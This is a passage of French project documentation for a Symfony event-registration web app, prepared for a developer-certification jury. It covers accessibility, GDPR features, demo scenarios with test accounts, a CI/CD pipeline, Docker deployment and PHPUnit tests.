<div id="title-help" class="form-text">Entre 5 et 160 caracteres</div>

{# Champs obligatoires indiques #}
<span class="text-danger" aria-hidden="true">*</span>
<span class="visually-hidden">champ obligatoire</span>

{# Messages d'erreur associes #}
{% if form.title.vars.errors|length > 0 %}
    <div class="invalid-feedback" role="alert" aria-live="polite">
        {{ form_errors(form.title) }}
    </div>
{% endif %}
```

### Navigation

```twig
{# Landmarks ARIA #}
<header role="banner">
    <nav role="navigation" aria-label="Navigation principale">
        <ul>
            <li><a href="{{ path('app_home') }}">Accueil</a></li>
            <li><a href="{{ path('app_events') }}" aria-current="page">Evenements</a></li>
        </ul>
    </nav>
</header>

<main role="main" id="main-content">
    {# Lien d'evitement #}
    <a href="#main-content" class="visually-hidden-focusable">
        Aller au contenu principal
    </a>

    {% block body %}{% endblock %}
</main>

<footer role="contentinfo">
    ...
</footer>
```

### Contrastes et Couleurs

```css
/* Contrastes suffisants (ratio 4.5:1 minimum) */
.btn-primary {
    background-color: #0d6efd;  /* Bleu Bootstrap */
    color: #ffffff;             /* Blanc */
    /* Ratio: 4.5:1 - Conforme AA */
}

/* Ne pas transmettre l'information par la couleur seule */
.alert-success {
    background-color: #d1e7dd;
    border-left: 4px solid #198754;  /* Indicateur visuel supplementaire */
}
.alert-success::before {
    content: "✓ ";  /* Icone en plus de la couleur */
}
```

### Focus Visible

```css
/* Focus visible pour navigation clavier */
a:focus, button:focus, input:focus, select:focus {
    outline: 3px solid #0d6efd;
    outline-offset: 2px;
}

/* Ne JAMAIS supprimer le outline sans alternative */
/* INTERDIT : outline: none; */
```

## 9.3 Checklist RGAA

| Critere | Description | Statut |
|---------|-------------|--------|
| 1.1 | Images avec alternative textuelle | OK |
| 3.1 | Informations non transmises par couleur seule | OK |
| 4.1 | Medias temporels avec alternative | N/A |
| 6.1 | Liens explicites | OK |
| 7.1 | Scripts accessibles | OK |
| 8.1 | HTML valide | OK |
| 9.1 | Structure headings | OK |
| 10.1 | Formulaires accessibles | OK |
| 11.1 | Navigation coherente | OK |
| 12.1 | Navigation clavier | OK |

---

# 10. RGPD (PROTECTION DES DONNEES)

## 10.1 Qu'est-ce que le RGPD ?

Le **Reglement General sur la Protection des Donnees** est le reglement europeen encadrant le traitement des donnees personnelles.

## 10.2 Donnees Collectees dans TheCrossLove

| Donnee | Finalite | Base legale | Conservation |
|--------|----------|-------------|--------------|
| Email | Authentification, contact | Contrat | Duree du compte |
| Nom, Prenom | Identification | Contrat | Duree du compte |
| Mot de passe (hashe) | Authentification | Contrat | Duree du compte |
| Inscriptions | Gestion evenements | Contrat | 3 ans apres evenement |
| Coordonnees GPS | Localisation optionnelle | Consentement | Jusqu'au retrait |
| Numero WhatsApp | Contact optionnel | Consentement | Jusqu'au retrait |

## 10.3 Droits des Utilisateurs Implementes

### Droit d'acces (Article 15)

```php
// L'utilisateur peut voir toutes ses donnees
#[Route('/profile', name: 'app_profile')]
public function profile(): Response
{
    $user = $this->getUser();
    $registrations = $user->getRegistrations();

    return $this->render('user/profile.html.twig', [
        'user' => $user,
        'registrations' => $registrations,
    ]);
}
```

### Droit de rectification (Article 16)

```php
// L'utilisateur peut modifier ses informations
#[Route('/profile/edit', name: 'app_profile_edit')]
public function editProfile(Request $request): Response
{
    $user = $this->getUser();
    $form = $this->createForm(ProfileFormType::class, $user);
    // ... traitement du formulaire
}
```

### Droit a l'effacement (Article 17)

```php
// L'utilisateur peut supprimer son compte
#[Route('/profile/delete', name: 'app_profile_delete', methods: ['POST'])]
public function deleteAccount(Request $request): Response
{
    if ($this->isCsrfTokenValid('delete_account', $request->get('_token'))) {
        $user = $this->getUser();

        // Anonymisation des donnees liees
        foreach ($user->getRegistrations() as $registration) {
            $registration->setWhatsappNumber(null);
            $registration->setLatitude(null);
            $registration->setLongitude(null);
        }

        // Suppression du compte
        $entityManager->remove($user);
        $entityManager->flush();

        // Deconnexion
        $this->container->get('security.token_storage')->setToken(null);
    }

    return $this->redirectToRoute('app_home');
}
```

### Droit a la portabilite (Article 20)

```php
// Export des donnees au format JSON
#[Route('/profile/export', name: 'app_profile_export')]
public function exportData(): JsonResponse
{
    $user = $this->getUser();

    $data = [
        'email' => $user->getEmail(),
        'firstName' => $user->getFirstName(),
        'lastName' => $user->getLastName(),
        'createdAt' => $user->getCreationUser()->format('Y-m-d H:i:s'),
        'registrations' => array_map(fn($r) => [
            'event' => $r->getEvent()->getTitle(),
            'date' => $r->getRegisteredAt()->format('Y-m-d H:i:s'),
            'status' => $r->getStatus(),
        ], $user->getRegistrations()->toArray()),
    ];

    return new JsonResponse($data);
}
```

## 10.4 Consentement Explicite

```twig
{# Formulaire d'inscription avec consentement #}
<form method="post">
    {{ form_start(form) }}

    {# Champs du formulaire... #}

    {# Consentement obligatoire #}
    <div class="form-check mb-3">
        <input type="checkbox" id="consent" name="consent"
               class="form-check-input" required>
        <label for="consent" class="form-check-label">
            J'accepte que mes donnees soient traitees conformement a la
            <a href="{{ path('app_privacy') }}" target="_blank">politique de confidentialite</a> *
        </label>
    </div>

    {# Consentement optionnel pour localisation #}
    <div class="form-check mb-3">
        <input type="checkbox" id="consent_location" name="consent_location"
               class="form-check-input">
        <label for="consent_location" class="form-check-label">
            J'accepte de partager ma localisation pour faciliter l'organisation
        </label>
    </div>

    <button type="submit">S'inscrire</button>
    {{ form_end(form) }}
</form>
```

## 10.5 Mentions Legales et Politique de Confidentialite

**A inclure dans le site :**

1. **Identite du responsable de traitement**
2. **Finalites du traitement**
3. **Base legale** (contrat, consentement)
4. **Destinataires des donnees**
5. **Duree de conservation**
6. **Droits des personnes**
7. **Contact DPO** (si applicable)
8. **Droit de reclamation** (CNIL)

---

# 11. DEMONSTRATION DE L'APPLICATION

## 11.1 Parcours de Demonstration

### Scenario 1 : Visiteur consulte les evenements

```
1. Acceder a la page d'accueil (/)
2. Cliquer sur "Voir tous les evenements"
3. Filtrer par categorie "Humanitaire"
4. Cliquer sur un evenement pour voir les details
5. Observer : titre, description, date, lieu, places disponibles
6. Tenter de s'inscrire -> Redirection vers login
```

### Scenario 2 : Utilisateur s'inscrit a un evenement

```
1. Se connecter avec : john.doe@example.com / password123
2. Naviguer vers un evenement a venir
3. Cliquer sur "S'inscrire"
4. Remplir le formulaire (optionnel : WhatsApp)
5. Valider -> Message de confirmation
6. Verifier dans "Mes inscriptions"
```

### Scenario 3 : Administrateur gere les evenements

```
1. Se connecter avec : admin@thecrosslove.com / admin123
2. Acceder au Dashboard (/admin)
3. Observer les statistiques : total evenements, inscriptions
4. Creer un nouvel evenement
5. Modifier un evenement existant
6. Consulter la liste des participants
7. Supprimer un evenement (avec confirmation CSRF)
```

## 11.2 Points Techniques a Montrer

| Fonctionnalite | Ou la montrer | Point technique |
|----------------|---------------|-----------------|
| Authentification | /login | form_login, security.yaml |
| Autorisation | /admin | #[IsGranted], access_control |
| CRUD | Admin events | EntityManager, persist/flush |
| Validation | Formulaires | #[Assert\...], constraints |
| Relations | Event/Category | ManyToOne, OneToMany |
| Securite | Suppression | Token CSRF |
| UX | Responsive | Bootstrap, grille responsive |

## 11.3 Donnees de Demonstration

### Comptes de test

| Role | Email | Mot de passe |
|------|-------|--------------|
| Admin | admin@thecrosslove.com | admin123 |
| User | john.doe@example.com | password123 |
| User | marie.martin@example.com | password123 |

### Evenements de test

- 5 evenements au Senegal (Fatick)
- 5 evenements en RDC (Bukavu)
- 1 evenement passe
- 1 evenement annule

### Charger les donnees

```bash
php bin/console doctrine:fixtures:load --no-interaction
```

---

# 12. DEVOPS (CI/CD)

## 12.1 Qu'est-ce que CI/CD ?

- **CI (Continuous Integration)** : Verification automatique du code a chaque commit
- **CD (Continuous Deployment)** : Deploiement automatique apres validation

## 12.2 Pipeline CI/CD avec GitHub Actions

```yaml
# .github/workflows/ci.yml

name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  # JOB 1 : Tests et qualite du code
  test:
    runs-on: ubuntu-latest

    services:
      mysql:
        image: mysql:8.0
        env:
          MYSQL_ROOT_PASSWORD: root
          MYSQL_DATABASE: thecrosslove_test
        ports:
          - 3306:3306
        options: --health-cmd="mysqladmin ping" --health-interval=10s

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup PHP
        uses: shivammathur/setup-php@v2
        with:
          php-version: '8.2'
          extensions: mbstring, xml, ctype, iconv, intl, pdo_mysql
          coverage: xdebug

      - name: Install dependencies
        run: composer install --prefer-dist --no-progress

      - name: Validate composer.json
        run: composer validate --strict

      - name: Check security vulnerabilities
        run: composer audit

      - name: Run database migrations
        run: |
          php bin/console doctrine:database:create --env=test --if-not-exists
          php bin/console doctrine:migrations:migrate --env=test --no-interaction

      - name: Run PHPUnit tests
        run: php bin/phpunit --coverage-text

      - name: Upload coverage report
        uses: codecov/codecov-action@v3

  # JOB 2 : Build Docker image
  build:
    needs: test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Login to Docker Hub
        uses: docker/login-action@v3
        with:
          username: ${{ secrets.DOCKER_USERNAME }}
          password: ${{ secrets.DOCKER_PASSWORD }}

      - name: Build and push
        uses: docker/build-push-action@v5
        with:
          push: true
          tags: thecrosslove/app:latest

  # JOB 3 : Deploiement
  deploy:
    needs: build
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'

    steps:
      - name: Deploy to production
        uses: appleboy/ssh-action@v1.0.0
        with:
          host: ${{ secrets.PRODUCTION_HOST }}
          username: ${{ secrets.PRODUCTION_USER }}
          key: ${{ secrets.SSH_PRIVATE_KEY }}
          script: |
            cd /var/www/thecrosslove
            docker compose pull
            docker compose up -d
            docker compose exec app php bin/console cache:clear
            docker compose exec app php bin/console doctrine:migrations:migrate --no-interaction
```

## 12.3 Etapes du Pipeline

```
+----------+     +----------+     +----------+     +----------+
|  Commit  | --> |   Test   | --> |  Build   | --> |  Deploy  |
+----------+     +----------+     +----------+     +----------+
     |                |                |                |
     |                |                |                |
     v                v                v                v
  Push code      PHPUnit          Docker           Production
  to GitHub      Security         Image            Server
                 Audit            Push
```

## 12.4 Configuration Docker Production

```yaml
# docker-compose.prod.yml
services:
  app:
    image: thecrosslove/app:latest
    environment:
      APP_ENV: prod
      APP_DEBUG: 0
      DATABASE_URL: mysql://user:pass@db:3306/thecrosslove
    depends_on:
      - db
    labels:
      - "traefik.enable=true"
      - "traefik.http.routers.app.rule=Host(`thecrosslove.com`)"
      - "traefik.http.routers.app.tls.certresolver=letsencrypt"

  db:
    image: mysql:8.0
    volumes:
      - db_data:/var/lib/mysql
    environment:
      MYSQL_ROOT_PASSWORD: ${DB_ROOT_PASSWORD}
      MYSQL_DATABASE: thecrosslove

  traefik:
    image: traefik:v3.0
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - letsencrypt:/letsencrypt
    command:
      - "--providers.docker=true"
      - "--entrypoints.web.address=:80"
      - "--entrypoints.websecure.address=:443"
      - "--certificatesresolvers.letsencrypt.acme.httpchallenge.entrypoint=web"
      - "--certificatesresolvers.letsencrypt.acme.email=admin@thecrosslove.com"
      - "--certificatesresolvers.letsencrypt.acme.storage=/letsencrypt/acme.json"

volumes:
  db_data:
  letsencrypt:
```

## 12.5 Commandes de Deploiement Manuel

```bash
# Sur le serveur de production

# 1. Mettre a jour le code
cd /var/www/thecrosslove
git pull origin main

# 2. Installer les dependances (production)
composer install --no-dev --optimize-autoloader

# 3. Vider le cache
php bin/console cache:clear --env=prod

# 4. Executer les migrations
php bin/console doctrine:migrations:migrate --no-interaction

# 5. Compiler les assets
php bin/console asset-map:compile

# 6. Redemarrer les services
docker compose restart
```

---

# 13. POLITIQUE DE TEST

## 13.1 Types de Tests Implementes

| Type | Objectif | Outils | Couverture |
|------|----------|--------|------------|
| **Unitaire** | Tester une methode isolee | PHPUnit | Entites : 90%+ |
| **Integration** | Tester les interactions | PHPUnit + Symfony | Controllers : 80%+ |
| **Fonctionnel** | Tester le parcours utilisateur | PHPUnit WebTestCase | Scenarios critiques |

## 13.2 Structure des Tests

```
tests/
├── Unit/                           # Tests unitaires
│   └── Entity/
│       ├── EventTest.php           # 45 tests
│       ├── UserTest.php            # 15 tests
│       ├── CategoryTest.php        # 8 tests
│       └── ToRegisterTest.php      # 10 tests
│
├── Integration/                    # Tests d'integration
│   └── Controller/
│       ├── AdminControllerTest.php
│       ├── EventControllerTest.php
│       ├── SecurityControllerTest.php
│       └── RegistrationControllerTest.php
│
└── bootstrap.php                   # Configuration
```

## 13.3 Exemple de Test Unitaire Complet

```php
<?php
// tests/Unit/Entity/EventTest.php

namespace App\Tests\Unit\Entity;

use App\Entity\Event;
use App\Entity\User;
use App\Entity\ToRegister;
use PHPUnit\Framework\TestCase;

class EventTest extends TestCase
{
    private Event $event;

    /**
     * Initialisation avant chaque test
     */
    protected function setUp(): void
    {
        $this->event = new Event();
        $this->event->setTitle('Evenement Test');
        $this->event->setDateStart(new \DateTime('+1 week'));
        $this->event->setDateEnd(new \DateTime('+1 week +2 hours'));
    }

    // =========== TESTS LOGIQUE METIER ===========

    /**
     * @test
     * Un evenement futur est considere comme "a venir"
     */
    public function testIsUpcomingReturnsTrueForFutureEvent(): void
    {
        // Given: un evenement dans le futur (setUp)

        // When: on verifie s'il est a venir
        $result = $this->event->isUpcoming();

        // Then: le resultat est true
        $this->assertTrue($result);
    }

    /**
     * @test
     * Un evenement passe n'est pas "a venir"
     */
    public function testIsUpcomingReturnsFalseForPastEvent(): void
    {
        // Given: un evenement dans le passe
        $this->event->setDateStart(new \DateTime('-1 week'));
        $this->event->setDateEnd(new \DateTime('-1 week +2 hours'));

        // When: on verifie s'il est a venir
        $result = $this->event->isUpcoming();

        // Then: le resultat est false
        $this->assertFalse($result);
    }

    /**
     * @test
     * Un evenement est complet quand le nombre d'inscrits atteint le maximum
     */
    public function testIsFullReturnsTrueWhenMaxReached(): void
    {
        // Given: un evenement avec 2 places max et 2 inscrits
        $this->event->setMaxParticipants(2);
        $this->event->addRegistration(new ToRegister());
        $this->event->addRegistration(new ToRegister());

        // When: on verifie s'il est complet
        $result = $this->event->isFull();

        // Then: le resultat est true
        $this->assertTrue($result);
    }

    /**
     * @test
     * Un evenement sans limite n'est jamais complet
     */
    public function testIsFullReturnsFalseWhenNoLimit(): void
    {
        // Given: un evenement sans limite de participants
        $this->event->setMaxParticipants(null);

        // When: on verifie s'il est complet
        $result = $this->event->isFull();

        // Then: le resultat est false
        $this->assertFalse($result);
    }

    /**
     * @test
     * canRegister retourne true pour un evenement futur non complet
     */
    public function testCanRegisterReturnsTrueForValidEvent(): void
    {
        // Given: un evenement futur avec des places
        $this->event->setMaxParticipants(50);

        // When: on verifie si on peut s'inscrire
        $result = $this->event->canRegister();

        // Then: le resultat est true
        $this->assertTrue($result);
    }

    /**
     * @test
     * canRegister retourne false pour un evenement passe
     */
    public function testCanRegisterReturnsFalseForPastEvent(): void
    {
        // Given: un evenement passe
        $this->event->setDateStart(new \DateTime('-1 week'));
        $this->event->setDateEnd(new \DateTime('-1 week +2 hours'));

        // When: on verifie si on peut s'inscrire
        $result = $this->event->canRegister();

        // Then: le resultat est false
        $this->assertFalse($result);
    }

    // =========== TESTS CALCULS ===========

    /**
     * @test
     * Calcul correct des places disponibles
     */
    public function testGetAvailableSeatsCalculatesCorrectly(): void
    {
        // Given: 50 places max, 12 inscrits
        $this->event->setMaxParticipants(50);
        for ($i = 0; $i < 12; $i++) {
            $this->event->addRegistration(new ToRegister());
        }

        // When: on calcule les places disponibles
        $result = $this->event->getAvailableSeats();

        // Then: 50 - 12 = 38
        $this->assertEquals(38, $result);
    }

    /**
     * @test
     * Duree calculee en heures
     */
    public function testGetDurationInHoursCalculatesCorrectly(): void
    {
        // Given: evenement de 10h a 14h30
        $this->event->setDateStart(new \DateTime('2026-03-15 10:00:00'));
        $this->event->setDateEnd(new \DateTime('2026-03-15 14:30:00'));

        // When: on calcule la duree
        $result = $this->event->getDurationInHours();

        // Then: 4h30 = 4.5 heures
        $this->assertEquals(4.5, $result);
    }
}
```

## 13.4 Exemple de Test Fonctionnel

```php
<?php
// tests/Integration/Controller/AdminControllerTest.php

namespace App\Tests\Integration\Controller;

use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;

class AdminControllerTest extends WebTestCase
{
    /**
     * @test
     * Un utilisateur non connecte ne peut pas acceder a l'admin
     */
    public function testAdminRequiresAuthentication(): void
    {
        $client = static::createClient();

        $client->request('GET', '/admin/');

        $this->assertResponseRedirects('/login');
    }

    /**
     * @test
     * Un utilisateur ROLE_USER ne peut pas acceder a l'admin
     */
    public function testAdminRequiresAdminRole(): void
    {
        $client = static::createClient();

        // Connexion en tant qu'utilisateur normal
        $userRepository = static::getContainer()->get(UserRepository::class);
        $user = $userRepository->findOneBy(['email' => 'john.doe@example.com']);
        $client->loginUser($user);

        $client->request('GET', '/admin/');

        $this->assertResponseStatusCodeSame(403);  // Forbidden
    }

    /**
     * @test
     * Un administrateur peut acceder au dashboard
     */
    public function testAdminCanAccessDashboard(): void
    {
        $client = static::createClient();

        // Connexion en tant qu'admin
        $userRepository = static::getContainer()->get(UserRepository::class);
        $admin = $userRepository->findOneBy(['email' => 'admin@thecrosslove.com']);
        $client->loginUser($admin);

        $client->request('GET', '/admin/');

        $this->assertResponseIsSuccessful();
        $this->assertSelectorTextContains('h1', 'Dashboard');
    }
}
```

## 13.5 Commandes de Test

```bash
# Executer tous les tests
php bin/phpunit

# Executer un fichier specifique
php bin/phpunit tests/Unit/Entity/EventTest.php

# Executer une methode specifique
php bin/phpunit --filter testIsUpcoming

# Avec couverture de code (HTML)
php bin/phpunit --coverage-html var/coverage

# Avec couverture de code (texte)
php bin/phpunit --coverage-text

# Mode verbose
php bin/phpunit -v
```

## 13.6 Metriques de Couverture

| Composant | Couverture | Objectif |
|-----------|------------|----------|
| Entity/Event | 95% | 90%+ |
| Entity/User | 90% | 90%+ |
| Entity/ToRegister | 85% | 80%+ |
| Controllers | 75% | 70%+ |
| **Global** | **85%** | **80%+** |

---

# 14. VEILLE TECHNOLOGIQUE ET SECURITE

## 14.1 Sources de Veille

### Veille Technologique

| Source | Type | Frequence | URL |
|--------|------|-----------|-----|
| Symfony Blog | Officiel | Hebdo | symfony.com/blog |
| PHP.net | Officiel | Mensuel | php.net |
| Dev.to | Communaute | Quotidien | dev.to |
| SymfonyCasts | Tutoriels | Hebdo | symfonycasts.com |
| Packagist | Packages | Continu | packagist.org |

### Veille Securite

| Source | Type | Frequence | URL |
|--------|------|-----------|-----|
| ANSSI | Alertes FR | Hebdo | cert.ssi.gouv.fr |
| OWASP | Standards | Mensuel | owasp.org |
| Symfony Security | Advisories | Continu | symfony.com/security |
| CVE Database | Vulnerabilites | Continu | cve.mitre.org |
| Composer Audit | Dependances | A chaque commit | `composer audit` |

## 14.2 Technologies Emergentes Surveillees

| Technologie | Description | Impact potentiel |
|-------------|-------------|------------------|
| **PHP 8.3/8.4** | Nouvelles fonctionnalites | Migration prevue |
| **Symfony 7.x** | LTS et nouveautes | Mise a jour continue |
| **AssetMapper** | Remplacement Webpack Encore | Deja utilise |
| **Doctrine 4** | Nouvelles fonctionnalites ORM | A surveiller |
| **Turbo/Stimulus** | Frontend moderne | Integration future |

## 14.3 Alertes de Securite

### Processus de Suivi

```
1. Inscription aux listes de diffusion
   - security@symfony.com
   - security-announce@php.net

2. Verification automatique des dependances
   composer audit

3. Mise a jour reguliere
   composer update --with-dependencies

4. Tests de regression apres mise a jour
   php bin/phpunit
```

### Dernieres Alertes Symfony (Exemple)

| Date | CVE | Severity | Composant | Action |
|------|-----|----------|-----------|--------|
| 2025-01 | CVE-2025-XXXX | High | Security | Mise a jour 7.3.1 |
| 2024-12 | CVE-2024-YYYY | Medium | Form | Mise a jour 7.2.5 |

## 14.4 Bonnes Pratiques Adoptees

### Code

- Utilisation de **PHP 8.2+** avec typage strict
- Respect des **PSR** (PSR-4, PSR-12)
- Analyse statique avec **PHPStan** (niveau 5+)
- Formatage avec **PHP-CS-Fixer**

### Securite

- **Dependances** : Verification avec `composer audit`
- **Headers HTTP** : CSP, X-Frame-Options, X-XSS-Protection
- **HTTPS** : Obligatoire via Traefik + Let's Encrypt
- **Logs** : Centralisation et monitoring

### DevOps

- **Conteneurisation** : Docker pour tous les environnements
- **CI/CD** : GitHub Actions
- **Monitoring** : Healthchecks, alertes

---

# PARTIE B - DOCUMENTATION TECHNIQUE DETAILLEE

---

# 15. ARCHITECTURE MVC

## 15.1 Le Pattern MVC Explique

Le **MVC (Model-View-Controller)** est un patron de conception qui separe l'application en trois couches :

```
                    REQUETE HTTP
                         |
                         v
    +--------------------------------------------+
    |              CONTROLLER                     |
    |  (Recoit la requete, coordonne le traitement)|
    +--------------------------------------------+
           |                        |
           v                        v
    +--------------+        +---------------+
    |    MODEL     |        |     VIEW      |
    | (Donnees et  |        | (Interface    |
    |  logique     |        |  utilisateur) |
    |  metier)     |        |               |
    +--------------+        +---------------+
           |                        |
           +------------------------+
                         |
                         v
                   REPONSE HTTP
```

### Analogie Simple

| Couche | Analogie Restaurant | Role |
|--------|---------------------|------|
| **Controller** | Chef de rang | Prend la commande, coordonne |
| **Model** | Cuisinier | Prepare les plats (donnees) |
| **View** | Serveur | Presente le plat (affichage) |

### Implementation Symfony

| Couche | Dossier | Fichiers |
|--------|---------|----------|
| Model | `src/Entity/` | User.php, Event.php, ... |
| Model | `src/Repository/` | UserRepository.php, ... |
| View | `templates/` | base.html.twig, event/show.html.twig |
| Controller | `src/Controller/` | AdminController.php, EventController.php |

---

# 16-24. [Sections techniques detaillees]

*Les sections 16 a 24 reprennent le contenu technique detaille de la version precedente du document (entites, controllers, formulaires, templates, migrations, Docker, glossaire, questions jury).*

*Voir les sections correspondantes dans la partie technique du document.*

---

# ANNEXES

## A. Checklist Complete pour le Jury

### Criteres d'Evaluation

| # | Critere | Section | Points cles |
|---|---------|---------|-------------|
| 1 | Cahier des Charges | [Section 1](#1-cahier-des-charges) | Contexte, objectifs, contraintes |
| 2 | Gestion de Projet | [Section 2](#2-gestion-de-projet) | Agile, Git, planning |
| 3 | Referencement SEO | [Section 3](#3-referencement-seo) | Balises, slugs, semantique |
| 4 | Conception UI/UX | [Section 4](#4-conception-uiux) | Responsive, accessibilite, wireframes |
| 5 | Modelisation MERISE | [Section 5](#5-modelisation-merise) | MCD, MLD, dictionnaire |
| 6 | Requetes SQL | [Section 6](#6-requetes-sql-et-jointures) | CRUD, jointures, agregations |
| 7 | Modelisation UML | [Section 7](#7-modelisation-uml) | Cas utilisation, classes, sequences |
| 8 | Securite | [Section 8](#8-securite-xss-csrf-sql-hashage-mdp) | XSS, CSRF, SQL, hashage |
| 9 | RGAA | [Section 9](#9-rgaa-accessibilite) | Images, formulaires, navigation |
| 10 | RGPD | [Section 10](#10-rgpd-protection-des-donnees) | Droits, consentement, mentions |
| 11 | Demonstration | [Section 11](#11-demonstration-de-lapplication) | Scenarios, comptes test |
| 12 | DevOps CI/CD | [Section 12](#12-devops-cicd) | Pipeline, Docker, deploiement |
| 13 | Politique de Test | [Section 13](#13-politique-de-test) | Unitaires, integration, couverture |
| 14 | Veille | [Section 14](#14-veille-technologique-et-securite) | Sources, alertes, bonnes pratiques |

## B. Commandes Utiles

```bash
# Demarrage rapide
composer install
php bin/console doctrine:database:create --if-not-exists
php bin/console doctrine:migrations:migrate --no-interaction
php bin/console doctrine:fixtures:load --no-interaction
symfony server:start

# Docker
docker compose up -d
# phpMyAdmin : http://localhost:8080

# Tests
php bin/phpunit
php bin/phpunit --coverage-html var/coverage

# Production
composer install --no-dev --optimize-autoloader
php bin/console cache:clear --env=prod
```

## C. Comptes de Demonstration

| Role | Email | Mot de passe |
|------|-------|--------------|
| Admin | admin@thecrosslove.com | admin123 |
| User | john.doe@example.com | password123 |
| User | marie.martin@example.com | password123 |

---

*Document genere le 30/01/2026 - TheCrossLove v1.0*
*Conforme aux criteres d'evaluation du titre CDA (Concepteur Developpeur d'Applications)*
